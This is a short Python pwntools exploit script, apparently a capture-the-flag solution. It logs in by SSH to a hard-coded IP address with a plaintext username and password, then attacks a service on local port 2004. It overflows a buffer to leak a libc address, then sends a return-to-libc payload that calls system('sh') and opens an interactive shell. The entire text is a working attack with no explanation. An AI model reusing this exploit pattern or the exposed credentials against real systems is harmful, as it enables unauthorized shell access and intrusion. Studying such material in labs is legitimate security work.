from pwn import *
import struct
import sys

# bufAddr = 0xffffd40b
# retAddr = 0xffffd47c
s = ssh(host='118.70.186.203', port=1017, user='sshuser', password='bkisbse123')

def leak():
    r = s.process('nc localhost 2004'.split(' '))
    payload = '-1\n' + 'a'*120
    r.sendline(payload)
    r.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    addr = r.recv(8)
    r.close()
    return u64(addr)
    
    
def exploit(leakedAddr):
    lib = ELF('libc.so.6')
    lib.address = leakedAddr - (lib.symbols['__libc_start_main']+74)
    #print p64(leakedAddr)
    #print "%x" % lib.address
    #print "systemaddr: %x" % lib.symbols['system']
    sshAddr = p64(lib.search('sh\x00').next())
    print sshAddr
    print '-----------------------------------------------'
    r = s.process("nc localhost 2004".split(' '))
    payload = '-1\n' + 'a'*120
    payload += p64(0x00400810)
    payload += 'b'*20+'a'*28+sshAddr+'A'*4
    payload += p64(lib.symbols['system'])
    r.send(payload)
    r.interactive()

leakedAddr = leak()
exploit(leakedAddr)







